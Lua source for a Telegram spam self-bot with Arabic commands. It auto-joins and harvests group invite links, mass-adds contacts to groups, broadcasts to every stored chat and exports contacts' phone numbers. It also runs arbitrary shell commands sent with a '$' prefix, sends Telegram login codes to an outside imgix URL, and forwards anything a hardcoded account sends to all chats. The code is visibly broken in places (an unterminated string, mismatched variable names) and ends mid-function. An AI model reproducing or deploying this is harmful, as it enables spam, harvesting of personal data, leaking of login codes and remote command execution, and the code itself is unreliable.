JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
local is_sudo
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("CONTROL:" .. CONTROL_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  if redis:sismember("CONTROL:" .. CONTROL_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
local is_full_sudo
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("CONTROL:" .. CONTROL_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  return issudo
end
local save_log
function save_log(text)
  text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  file = io.open("CONTROL_" .. CONTROL_id .. "_logs.txt", "w")
  file:write(text)
  file:close()
  return true
end
local writefile
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
local check_link
function check_link(extra, result)
  if result.is_group_ or result.is_supergroup_channel_ then
    if not redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":notjoinlinks") then
      tdcli.importChatInviteLink(extra.link)
    end
    if not redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":notsavelinks") then
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":savedlinks", extra.link)
    end
    return
  end
end
local chat_type
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
local contact_list
function contact_list(extra, result)
  local count = result.total_count_
  local text = "Robot Contacts : \n"
  for i = 0, tonumber(count) - 1 do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "\n"
  end
  writefile("CONTROL_" .. tostring(CONTROL_id) .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "CONTROL_" .. tostring(CONTROL_id) .. "_contacts.txt", "CONTROL " .. tostring(CONTROL_id) .. " Contacts!")
  return io.popen("rm -rf CONTROL_" .. tostring(CONTROL_id) .. "_contacts.txt"):read("*all")
end
local our_id
function our_id(extra, result)
  if result then
    redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo", JSON.encode(result))
  end
end
local process_links
function process_links(text)
  if text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
    text = text:gsub("telegram.dog", "telegram.me")
    local matches = {
      text:match("(https://t.me/joinchat/%S+)")
    }
    for i, v in pairs(matches) do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, {link = v})
    end
  end
end
local add
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember("CONTROL:" .. tostring(CONTROL_id) .. ":all", id) then
    if chat_type_ == "private" then
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":pvis", id)
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    elseif chat_type_ == "group" then
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":groups", id)
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    elseif chat_type_ == "channel" then
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":channels", id)
      redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    end
  end
  return true
end
local rem
function rem(id)
  if redis:sismember("CONTROL:" .. tostring(CONTROL_id) .. ":all", id) then
    if msg.chat_type_ == "private" then
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":pvis", id)
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    elseif msg.chat_type_ == "group" then
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":groups", id)
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    elseif msg.chat_type_ == "channel" then
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":channels", id)
      redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":all", id)
    end
  end
  return true
end
local process_updates
function process_updates()
  if not redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":gotupdated") then
    local info = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
    end
  end
end
local process
function process(msg)
  local text_ = msg.content_.text_
  process_updates()
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^[!/#](رفع مطور) (%d+)") then
        local matches = {
          text_:match("^[!/#](رفع مطور) (%d+)")
        }
        if #matches == 2 then
          redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Added " .. matches[2] .. " As Sudo")
          return tostring(matches[2]) .. " Added to Sudo Users"
        end
			    elseif text_:match("^[!/#](الاوامر)") and is_sudo(msg) then
      local text1 = [[
اهلا صديقي جميع الاوامر تعمل ب (/#!)
👨‍⚖️¦/م1 » اوامر الارسال
📟¦ /م2 » اوامر الحفظ التلقائي
🛡¦ /م3 » اوامر الجهات والاضافة
⚙️¦ /م4 » اوامر اخرى
 - المطور ♥️ >> @amody7 ]]
return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
	  
      elseif text_:match("^[!/#](تنزيل مطور) (%d+)") then
        local matches = {
          text_:match("^[!/#](تنزيل مطور) (%d+)")
        }
        if #matches == 2 then
          redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Removed " .. matches[2] .. " From Sudoers")
          return tostring(matches[2]) .. " صاحب هذا الايدي تم ازالته من قائمة مطورين البوت ✅"
        end
      elseif text_:match("^[!/#]المطورين$") then
        local sudoers = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":sudoers")
        local text = "- قائمة مطورين البوت ، 🚸'\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
      elseif text_:match("^[!/#](sendlogs)$") then
        tdcli.send_file(msg.chat_id_, "Document", "CONTROL_" .. tostring(CONTROL_id) .. "_logs.txt", "CONTROL " .. tostring(CONTROL_id) .. " Logs!")
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
      elseif text_:match("^[!/#](وضع اسم) '(.*)' '(.*)'$") then
        local matches = {
          text_:match("^[!/#](وضع اسم) '(.*)' '(.*)'$")
        }
        if #matches == 3 then
          tdcli.changeName(matches[2], matches[3])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Name To " .. matches[2] .. " " .. matches[3])
          return "- تم تغيير اسم البوت الى ، 📌':- " .. matches[2] .. " " .. matches[3]
        end
      elseif text_:match("^[!/#](وضع معرف) (.*)$") then
        local matches = {
          text_:match("^[!/#](وضع معرف) (.*)$")
        }
        if #matches == 2 then
          tdcli.changeUsername(matches[2])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Username To " .. matches[2])
          return "- تم تغيير معرف البوت الى ، 🔖':- @" .. matches[2]
        end
      elseif text_:match("^[!/#](delusername)$") then
        tdcli.changeUsername()
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Username")
        return "- تم حذف معرف البوت ، 🔖'"
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^[!/#](ارسال) (%d+) (.*)") then
      local matches = {
        text_:match("^[!/#](ارسال) (%d+) (.*)")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A ارسال To " .. matches[2] .. ", Content : " .. matches[3])
        return "- تم ارسال الرسالة الى الجميع بنجاح ،✅'"
      end
	  
    elseif text_:match("^[!/#](setanswer) '(.*)' (.*)") then
      local matches = {
        text_:match("^[!/#](setanswer) '(.*)' (.*)")
      }
      if #matches == 3 then
        redis:hset("CONTROL:" .. tostring(CONTROL_id) .. ":الردود", matches[2], matches[3])
        redis:sadd("CONTROL:" .. tostring(CONTROL_id) .. ":الردودlist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. maches[3])
        return "Answer for " .. tostring(matches[2]) .. " set to :\n" .. tostring(matches[3])
      end
    elseif text_:match("^[!/#](delanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](delanswer) (.*)")
      }
      if #matches == 2 then
        redis:hdel("CONTROL:" .. tostring(CONTROL_id) .. ":الردود", matches[2])
        redis:srem("CONTROL:" .. tostring(CONTROL_id) .. ":الردودlist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return "Answer for " .. tostring(matches[2]) .. " deleted"
      end
    elseif text_:match("^[!/#]الردود$") then
      local text = "- قائمة ردود البوت التلقائية  ،🗣' :\n"
      local answrs = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":الردودlist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget("CONTROL:" .. tostring(CONTROL_id) .. ":الردود", v)) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested الردود List")
      return text
    elseif text_:match("^[!/#]leave$") then
      local info = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo")
      if info then
        botinfo = JSON.decode(info)
      else
        tdcli_function({ID = "GetMe"}, our_id, nil)
        botinfo = JSON.decode(info)
      end
      save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. msg.chat_id_)
      if chat_type(msg.chat_id_) == "channel" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Left")
      elseif chat_type(msg.chat_id_) == "chat" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Kicked")
      end
    elseif text_:match("^[!/#](leave) (%d+)$") then
      local matches = {
        text_:match("^[!/#](leave) (%d+)$")
      }
      if #matches == 2 then
        local info = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo")
        if info then
          botinfo = JSON.decode(info)
        else
          tdcli_function({ID = "GetMe"}, our_id, nil)
          botinfo = JSON.decode(info)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. matches[2])
        local chat = tonumber(matches[2])
        if chat_type(chat) == "channel" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Left")
        elseif chat_type(chat) == "chat" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Kicked")
        end
        return "Leaved " .. matches[2]
      end
    elseif text_:match("^[!/#](انضم) (%d+)$") then
      local matches = {
        text_:match("^[!/#](انضم) (%d+)$")
      }
      save_log("User " .. msg.sender_user_id_ .. ", Joined " .. matches[2] .. " Via Bot")
      tdcli.addChatMember(tonumber(matches[2]), msg.sender_user_id_, 50)
      return "I've Invited You To " .. matches[2]
    elseif text_:match("^[!/#]اضافة الجهات$") and msg.chat_type_ ~= "private" then
      local add_all
      function add_all(extra, result)
        local usrs = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":pvis")
        for i = 1, #usrs do
          tdcli.addChatMember(msg.chat_id_, usrs[i], 50)
        end
        local count = result.total_count_
        for i = 0, tonumber(count) - 1 do
          tdcli.addChatMember(msg.chat_id_, result.users_[i].id_, 50)
        end
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, add_all, {})
      save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
      return "- تم اضافة جميع جهات الاتصال  في المجموعة ،🚸'
    elseif text_:match("^[!/#]الجهات$") then
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_list, {
        chat_id_ = msg.chat_id_
      })
    elseif text_:match("^[!/#]استخراج الروابط$") then
      local text = "Group Links :\n"
      local links = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":savedlinks")
      for i, v in pairs(links) do
        if v:len() == 51 then
          text = tostring(text) .. tostring(v) .. "\n"
        else
          local _ = redis:rem("CONTROL:" .. tostring(CONTROL_id) .. ":savedlinks", v)
        end
      end
      writefile("CONTROL_" .. tostring(CONTROL_id) .. "_links.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "روابطك" .. tostring(CONTROL_id) .. "_المحفوظة.txt", "لديك " .. tostring(CONTROL_id) .. " رابط محفوظ")
      save_log("User " .. msg.sender_user_id_ .. ", Requested Contact List")
      return io.popen("rm -rf CONTROL_" .. tostring(CONTROL_id) .. "_links.txt"):read("*all")
    elseif text_:match("[!/#](حظر) (%d+)") then
      local matches = {
        text_:match("[!/#](حظر) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return "- تم حظر العضو بنجاح ، 📵'"
      end
    elseif text_:match("[!/#](الغاء الحظر) (%d+)") then
      local matches = {
        text_:match("[!/#](الغاء الحظر) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return "- تم الغاء حظر العضو بنجاح ، 📵'"
      end
    elseif text_:match("^[!/#](s2a) (.*) (.*)") then
      local matches = {
        text_:match("^[!/#](s2a) (.*) (.*)")
      }
      if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
        local all = redis:smembers("CONTROL:" .. tonumber(CONTROL_id) .. ":all")
        tdcli.searchPublicChat("Crwn_bot")
        local inline2
        function inline2(argg, data)
          if data.results_ and data.results_[0] then
            return tdcli_function({
              ID = "SendInlineQueryResultMessage",
              chat_id_ = argg.chat_id_,
              reply_to_message_id_ = 0,
              disable_notification_ = 0,
              from_background_ = 1,
              query_id_ = data.inline_query_id_,
              result_id_ = data.results_[0].id_
            }, nil, nil)
          end
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
      end
    elseif text_:match("^[!/#]معلومات$") then
      local contact_num
      function contact_num(extra, result)
        redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("CONTROL:" .. tostring(CONTROL_id) .. ":groups")
      local sgps = redis:scard("CONTROL:" .. tostring(CONTROL_id) .. ":channels")
      local pvs = redis:scard("CONTROL:" .. tostring(CONTROL_id) .. ":pvis")
      local links = redis:scard("CONTROL:" .. tostring(CONTROL_id) .. ":savedlinks")
      local sudo = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":fullsudo")
      local contacts = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":totalcontacts")
      local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
          local text = [[
ֆ - - - - - - - - - - - - - - ֆ
- 📝 معلومات البوت الحالية ، 📌
- 🔖   المراسلهم :  ]] .. tostring(pvs) .. [[
            
- 📯    المجموعات العادية : ]] .. tostring(gps) .. [[
            
-📊    المجموعات الخارقة : ]] .. tostring(sgps) .. [[
            
- 📨     الروابط المحفوظة :  ]] .. tostring(links) .. [[

🗃    الجهات المحفوظة : ]] .. tostring(contacts)
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "")
    elseif text_:match("^[!/#](addedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](addedmsg) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "Added Message Turned On"
        elseif matches[2] == "تعطيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "Added Message Turned Off"
        end
      end
    elseif text_:match("^[!/#](حفظ الجهات تلقائيا) (.*)") then
      local matches = {
        text_:match("^[!/#](حفظ الجهات تلقائيا) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "- تم تفعيل خاصية حفظ الجهات تلقائيا ، 👤'"
        elseif matches[2] == "تعطيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "- تم تعطيل خاصية حفظ الجهات تلقائيا ، 👤'"
        end
      end
    elseif text_:match("^[!/#](قرائة الرسائل) (.*)") then
      local matches = {
        text_:match("^[!/#](قرائة الرسائل) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "- تم تفعيل خاصية تمت قرائة الرسالة ، 👤'"
        elseif matches[2] == "تعطيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "- تم تعطيل خاصية تمت قرائة الرسالة ، 👤'"
        end
      end
    elseif text_:match("^[!/#](الانضمام التلقائي) (.*)") then
      local matches = {
        text_:match("^[!/#](الانضمام التلقائي) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":notjoinlinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Joinlinks")
          return "- تم تفعيل خاصية الانضمام التلقائي الى الروابط ، 👤'"
        elseif matches[2] == "تعطيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":notjoinlinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Joinlinks")
          return "- تم تعطيل خاصية الانضمام التلقائي الى الروابط ، 👤'"
        end
      end
    elseif text_:match("^[!/#](حفظ الروابط) (.*)") then
      local matches = {
        text_:match("^[!/#](حفظ الروابط) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":notsavelinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Savelinks")
          return "- تم تفعيل خاصية حفظ روابط المجموعات والقنوات ، 👤'"
        elseif matches[2] == "تعطيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":notsavelinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Savelinks")
          return "- تم تعطيل خاصية حفظ روابط المجموعات والقنوات ، 👤'"
        end
      end
    elseif text_:match("^[!/#](حفظ الجهات) (.*)") then
      local matches = {
        text_:match("^[!/#](حفظ الجهات) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":notaddcontacts")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Addcontacts")
          return "Addcontacts Turned On"
        elseif matches[2] == "تعطيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":notaddcontacts", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Addcontacts")
          return "Addcontacts Turned Off"
        end
      end
    elseif text_:match("^[!/#](autochat) (.*)") then
      local matches = {
        text_:match("^[!/#](autochat) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":autochat", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Autochat")
          return "Autochat Turned On"
        elseif matches[2] == "تعطيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":autochat")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Autochat")
          return "Autochat Turned Off"
        end
      end
    elseif text_:match("^[!/#](جاري الكتابة) (.*)") then
      local matches = {
        text_:match("^[!/#](جاري الكتابة) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "تفعيل" then
          redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":typing", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Typing")
          return "- تم تفعيل خاصية جاري الكتابة ، 💭"
        elseif matches[2] == "تعطيل" then
          redis:del("CONTROL:" .. tostring(CONTROL_id) .. ":typing")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Typing")
          return "- تم تعطيل خاصية جاري الكتابة ، 💭"
        end
      end
    elseif text_:match("^[!/#](setaddedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](setaddedmsg) (.*)")
      }
      if #matches == 2 then
        redis:set("CONTROL:" .. tostring(CONTROL_id) .. ":addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
New Added Message Set
Message :
]] .. tostring(matches[2])
      end
    elseif text_:match("^[!/#](اذاعه) (.*)") then
      local matches = {
        text_:match("^[!/#](اذاعه) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "- تم عمل اذاعه لهذه الرسالة ، 👁'"
      end
    elseif text_:match("^[!/#](توجيه) (.*)$") then
      local matches = {
        text_:match("^[!/#](توجيه) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "الكل" then
          local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "الخاص" then
          local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "المجموعات العادية" then
          local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "المجموعات الخارقة" then
          local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "- تم عمل توجيه لهذه الرسالة ، 👁'"
    else
      local matches = {
        text_:match("^[!/#](كول) (.*)")
      }
      if text_:match("^[!/#](كول) (.*)") and #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used كول, Content : " .. matches[2])
        return matches[2]
      end
    end
  end
end
local proc_pv
function proc_pv(msg)
  if msg.chat_type_ == "private" then
    add(msg)
  end
end
local update
function update(data, CONTROL_id)
  msg = data.message_
  if data.ID == "UpdateNewMessage" then
    if msg.sender_user_id_ == 777000 then
      if data.message_.content_.text_:match([[
Your login code:
(%d+)
This code]]) then
        local code = {
          data.message_.content_.text_:match([[
Your login code:
(%d+)
This code]])
        }
        local file = ltn12.sink.file(io.open("CONTROL_" .. CONTROL_id .. "_code.png", "w"))
        http.request({
          url = "http://CONTROL.imgix.net/CONTROL.png?txt=Telegram%20Code%20:%20" .. code[1] .. "&txtsize=602&txtclr=ffffff&txtalign=middle,center&txtfont=Futura%20Condensed%20Medium&txtfit=max",
          sink = file
        })
        local sudo = tonumber(redis:get("CONTROL:" .. CONTROL_id .. ":fullsudo"))
        tdcli.send_file(sudo, "Photo", "CONTROL_" .. CONTROL_id .. "_code.png", nil)
      end
    elseif msg.sender_user_id_ == 11111111 then
      local all = redis:smembers("CONTROL:" .. tostring(CONTROL_id) .. ":all")
      local id = msg.id_
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
        }, dl_cb, nil)
      end
    end
    msg.chat_type_ = chat_type(msg.chat_id_)
    proc_pv(msg)
    if not msg.content_.text_ then
      if msg.content_.caption_ then
        msg.content_.text_ = msg.content_.caption_
      else
        msg.content_.text_ = nil
      end
    end
    local text_ = msg.content_.text_
    if not redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo") then
      tdcli_function({ID = "GetMe"}, our_id, nil)
    end
    local botinfo = JSON.decode(redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":botinfo"))
    our_id = botinfo.id_
    if msg.content_.ID == "MessageText" then
      local result = process(msg)
      if result then
        if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, result, 1, "html")
      end
      process_links(text_)
      if redis:sismember("CONTROL:" .. tostring(CONTROL_id) .. ":الردودlist", msg.content_.text_) then
        if msg.sender_user_id_ ~= our_id then
          local answer = redis:hget("CONTROL:" .. tostring(CONTROL_id) .. ":الردود", msg.content_.text_)
          if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":typing") then
            tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
          end
          if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":autochat") then
            tdcli.sendMessage(msg.chat_id_, 0, 1, answer, 1, "html")
          end
        end
        if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":markread") then
          return tdcli.viewMessages(msg.chat_id_, {
            [0] = msg.id_
          })
        end
      end
    elseif msg.content_.ID == "MessageContact" then
      local first = msg.content_.contact_.first_name_ or "-"
      local last = msg.content_.contact_.last_name_ or "-"
      local phone = msg.content_.contact_.phone_number_
      local id = msg.content_.contact_.user_id_
      if not redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":notaddcontacts") then
        tdcli.add_contact(phone, first, last, id)
      end
      if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":addedmsg") then
        local answer = redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":addedmsgtext") or [[
Addi
Bia pv]]
        if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":typing") then
          tdcli.sendChatAction(msg.chat_id_, "Typing", 100)
        end
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, answer, 1, "html")
      end
      if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":addedcontact") and msg.sender_user_id_ ~= our_id then
        return tdcli.sendContact(msg.chat_id_, msg.id_, 0, 0, nil, botinfo.phone_number_, botinfo.first_name_, botinfo.last_name_, botinfo.id_)
      end
    elseif msg.content_.ID == "MessageChatDeleteMember" and msg.content_.id_ == our_id then
      return rem(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      return add(msg.chat_id_)
    elseif msg.content_.ID == "MessageChatAddMembers" then
      for i = 0, #msg.content_.members_ do
        if msg.content_.members_[i].id_ == our_id then
          add(msg.chat_id_)
          break
        end
      end
    elseif msg.content_.caption_ then
      if redis:get("CONTROL:" .. tostring(CONTROL_id) .. ":markread") then
        tdcli.viewMessages(msg.chat_id_, {
          [0] = msg.id_
        })
      end
      return process_links(msg.content_.caption_)
    end
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 11111111 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 11111111 then
      tdcli.unblockUser(data.chat_.id_)
